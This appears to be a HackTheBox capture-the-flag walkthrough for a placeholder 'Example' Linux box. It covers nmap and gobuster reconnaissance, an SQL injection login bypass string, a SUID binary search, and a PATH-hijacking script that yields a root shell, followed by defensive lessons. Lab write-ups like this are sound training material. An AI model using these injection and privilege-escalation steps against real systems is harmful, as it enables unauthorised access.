---
title: "HackTheBox: Example Box"
date: 2026-03-10
tags: htb, linux
difficulty: easy
description: Walkthrough of the Example box on HackTheBox - exploiting a misconfigured web app and privilege escalation via SUID binary.
---

| Info | Detail |
|------|--------|
| Platform | HackTheBox |
| OS | Linux |
| Difficulty | Easy |
| IP | 10.10.10.XX |

## Reconnaissance

Start with an Nmap scan:

```
nmap -sV -sC -oA nmap/example 10.10.10.XX
```

Results show ports 22 (SSH) and 80 (HTTP) open.

## Enumeration

### Web Server (Port 80)

Browsing to the target reveals a default Apache page. Run Gobuster:

```
gobuster dir -u http://10.10.10.XX -w /usr/share/wordlists/dirb/common.txt
```

Found `/admin` directory with a login form.

## Foothold

The login form is vulnerable to SQL injection:

```
admin' OR 1=1 --
```

This reveals credentials for SSH access.

## Privilege Escalation

Check for SUID binaries:

```
find / -perm -4000 -type f 2>/dev/null
```

Found a custom binary at `/usr/local/bin/backup`. Running `strings` on it reveals it calls `tar` without a full path.

### Path Hijacking

```bash
echo '/bin/bash' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
/usr/local/bin/backup
```

Root shell obtained.

## Flags

- **User**: `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`
- **Root**: `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`

## Lessons Learned

- Always sanitize user input (SQL injection)
- Use full paths in SUID binaries
- Regularly audit SUID/SGID permissions
